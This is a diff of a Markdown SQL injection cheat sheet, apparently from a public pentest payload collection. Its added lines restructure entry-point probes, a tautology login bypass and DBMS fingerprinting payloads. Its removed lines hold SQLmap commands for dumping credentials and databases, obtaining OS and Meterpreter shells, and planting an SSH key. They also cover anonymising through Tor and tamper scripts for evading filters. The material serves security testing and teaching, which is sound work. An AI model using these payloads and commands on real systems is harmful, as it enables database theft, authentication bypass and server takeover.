@@ -3,6 +3,7 @@
 > A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.
 
 Attempting to manipulate SQL queries may have goals including:
+
 - Information Leakage
 - Disclosure of stored data
 - Manipulation of stored data
@@ -19,22 +20,9 @@ Attempting to manipulate SQL queries may have goals including:
   * [Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
   * [HQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/HQL%20Injection.md)
   * [DB2 Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
+  * [SQLmap Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap%20Cheatsheet.md)
 * [Entry point detection](#entry-point-detection)
 * [DBMS Identification](#dbms-identification)
-* [SQL injection using SQLmap](#sql-injection-using-sqlmap)
-  * [Basic arguments for SQLmap](#basic-arguments-for-sqlmap)
-  * [Load a request file and use mobile user-agent](#load-a-request-file-and-use-mobile-user-agent)
-  * [Custom injection in UserAgent/Header/Referer/Cookie](#custom-injection-in-useragentheaderreferercookie)
-  * [Second order injection](#second-order-injection)
-  * [Shell](#shell)
-  * [Crawl a website with SQLmap and auto-exploit](#crawl-a-website-with-sqlmap-and-auto-exploit)
-  * [Using TOR with SQLmap](#using-tor-with-sqlmap)
-  * [Using a proxy with SQLmap](#using-a-proxy-with-sqlmap)
-  * [Using Chrome cookie and a Proxy](#using-chrome-cookie-and-a-proxy)
-  * [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
-  * [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
-  * [Reduce Requests Number](#reduce-requests-number)
-  * [SQLmap without SQL injection](#sqlmap-without-sql-injection)
 * [Authentication bypass](#authentication-bypass)
   * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
 * [Polyglot injection](#polyglot-injection-multicontext)
@@ -55,33 +43,15 @@ Attempting to manipulate SQL queries may have goals including:
 
 ## Entry point detection
 
-Detection of an SQL injection entry point
+Detecting the entry point in SQL injection (SQLi) involves identifying locations in an application where user input is not properly sanitized before it is included in SQL queries.
 
 * **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.
-  * Simple characters
-    ```sql
-    '
-    %27
-    "
-    %22
-    #
-    %23
-    ;
-    %3B
-    )
-    Wildcard (*)
-    &apos;  # required for XML content
-    ```
-  * Multiple encoding
-    ```sql
-    %%2727
-    %25%27
-    ```
-  * Unicode characters
-    ```
-    Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (")
-    Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (')
-    ```
+  * Simple characters: `'`, `"`, `;`, `)` and `*`
+  * Simple characters encoded: `%27`, `%22`, `%23`, `%3B`, `%29` and `%2A`
+  * Multiple encoding: `%%2727`, `%25%27`
+  * Unicode characters: `U+02BA`, `U+02B9`
+      * MODIFIER LETTER DOUBLE PRIME (`U+02BA` encoded as `%CA%BA`) is transformed into `U+0022` QUOTATION MARK (`)
+      * MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')
 
 * **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.
   * Merging characters
@@ -104,41 +74,44 @@ Detection of an SQL injection entry point
 * **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.
 
 
-
 ## DBMS Identification
 
-```c
-["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
-["connection_id()=connection_id()"                 ,"MYSQL"],
-["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
-["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
-["@@CONNECTIONS>0"                                 ,"MSSQL"],
-["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
-["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
-["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
-["ROWNUM=ROWNUM"                                   ,"ORACLE"],
-["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
-["LNNVL(0=123)"                                    ,"ORACLE"],
-["5::int=5"                                        ,"POSTGRESQL"],
-["5::integer=5"                                    ,"POSTGRESQL"],
-["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
-["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
-["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
-["current_database()=current_database()"           ,"POSTGRESQL"],
-["sqlite_version()=sqlite_version()"               ,"SQLITE"],
-["last_insert_rowid()>1"                           ,"SQLITE"],
-["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
-["val(cvar(1))=1"                                  ,"MSACCESS"],
-["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
-["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
-["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
-["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
-```
+### DBMS Identification Keyword Based
 
-## DBMS Identification VIA Error
+Certain SQL keywords are specific to particular database management systems (DBMS). By using these keywords in SQL injection attempts and observing how the website responds, you can often determine the type of DBMS in use.
 
-DBMS                  | Example Error Message                                                                    | Example Payload |
-|---------------------|------------------------------------------------------------------------------------------|-----------------|
+| DBMS                | SQL Payload                     |
+| ------------------- | ------------------------------- |
+| MySQL               | `conv('a',16,2)=conv('a',16,2)` |
+| MySQL               | `connection_id()=connection_id()` |
+| MySQL               | `crc32('MySQL')=crc32('MySQL')` |
+| MSSQL               | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
+| MSSQL               | `@@CONNECTIONS>0` |
+| MSSQL               | `@@CONNECTIONS=@@CONNECTIONS` |
+| MSSQL               | `@@CPU_BUSY=@@CPU_BUSY` |
+| MSSQL               | `USER_ID(1)=USER_ID(1)` |
+| ORACLE              | `ROWNUM=ROWNUM` |
+| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |
+| ORACLE              | `LNNVL(0=123)` |
+| POSTGRESQL          | `5::int=5` |
+| POSTGRESQL          | `5::integer=5` |
+| POSTGRESQL          | `pg_client_encoding()=pg_client_encoding()` |
+| POSTGRESQL          | `get_current_ts_config()=get_current_ts_config()` |
+| POSTGRESQL          | `quote_literal(42.5)=quote_literal(42.5)` |
+| POSTGRESQL          | `current_database()=current_database()` |
+| SQLITE              | `sqlite_version()=sqlite_version()` |
+| SQLITE              | `last_insert_rowid()>1` |
+| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |
+| MSACCESS            | `val(cvar(1))=1` |
+| MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |
+
+
+### DBMS Identification Error Based
+
+Different DBMSs return distinct error messages when they encounter issues. By triggering errors and examining the specific messages sent back by the database, you can often identify the type of DBMS the website is using.
+
+| DBMS                | Example Error Message                                                                    | Example Payload |
+| ------------------- | -----------------------------------------------------------------------------------------|-----------------|
 | MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |
 | PostgreSQL          | `ERROR: unterminated quoted string at or near "'"`                                       | `'`             |
 | PostgreSQL          | `ERROR: syntax error at or near "1"`                                                     | `1'`            |
@@ -148,166 +121,8 @@ DBMS                  | Example Error Message                                   
 | Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |
 | Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |
 | Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |
-------------------------------------------------------------------------------------------------------------------------------------
 
 
-## SQL injection using SQLmap
-
-[sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities and taking over database servers.
-
-### Basic arguments for SQLmap
-
-```powershell
-sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
-```
-
-### Load a request file and use mobile user-agent
-
-```powershell
-sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
-```
-
-### Custom injection in UserAgent/Header/Referer/Cookie
-
-```powershell
-python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
-The injection is located at the '*'
-```
-
-### Second order injection
-
-```powershell
-python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
-sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
-```
-
-### Shell
-
-* SQL Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell`
-* OS Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell`
-* Meterpreter: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn`
-* SSH Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/`
-
-
-### Crawl a website with SQLmap and auto-exploit
-
-```powershell
-sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
-
---batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
---crawl = how deep you want to crawl a site
---forms = Parse and test forms
-```
-
-### Using TOR with SQLmap
-
-```powershell
-sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
-```
-
-### Using a proxy with SQLmap
-
-```powershell
-sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
-```
-
-### Using Chrome cookie and a Proxy
-
-```powershell
-sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
-```
-
-### Using suffix to tamper the injection
-
-```powershell
-python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
-```
-
-
-### General tamper option and tamper's list
-
-```powershell
-tamper=name_of_the_tamper
-```
-
-| Tamper | Description |
-| --- | --- |
-|0x2char.py | Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart |
-|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
-|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
-|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
-|base64encode.py | Base64 all characters in a given payload  |
-|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
-|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
-|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
-|charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) |
-|charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) |
-|charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054) |
-|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
-|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
-|commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -> /**/() |
-|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
-|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
-|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
-|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |
-|escapequotes.py | Slash escape quotes (' and ") |
-|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
-|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
-|htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> &#39;) |
-|ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart| 
-|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
-|informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
-|least.py | Replaces greater than operator (‘>’) with ‘LEAST’ counterpart |
-|lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -> select) |
-|modsecurityversioned.py | Embraces complete query with versioned comment |
-|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
-|multiplespaces.py | Adds multiple spaces around SQL keywords |
-|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
-|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
-|overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
-|percentage.py | Adds a percentage sign ('%') infront of each character  |
-|plus2concat.py | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart |
-|plus2fnconcat.py | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart |
-|randomcase.py | Replaces each keyword character with random case value |
-|randomcomments.py | Add random comments to SQL keywords|
-|securesphere.py | Appends special crafted string |
-|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
-|space2comment.py | Replaces space character (' ') with comments |
-|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
-|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
-|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
-|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
-|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
-|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
-|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
-|space2plus.py |  Replaces space character (' ') with plus ('+')  |
-|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
-|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
-|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
-|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
-|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
-|varnish.py | Append a HTTP header 'X-originating-IP' |
-|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
-|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
-|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For' |
-
-
-### Reduce Requests Number
-
-`--test-filter` is helpful when you want to focus on specific types of SQL injection techniques or payloads. Instead of testing the full range of payloads that SQLMap has, you can limit it to those that match a certain pattern, making the process more efficient, especially on large or slow web applications.
-
-```ps1
-sqlmap -u "https://lab_host/filter?category=demo" -p category --test-filter="Generic UNION query (NULL)"
-```
-
-
-### SQLmap without SQL injection
-
-You can use SQLmap to access a database via its port instead of a URL.
-
-```ps1
-sqlmap.py -d "mysql://user:pass@ip/database" --dump-all
-```
 
 ## Authentication bypass
 
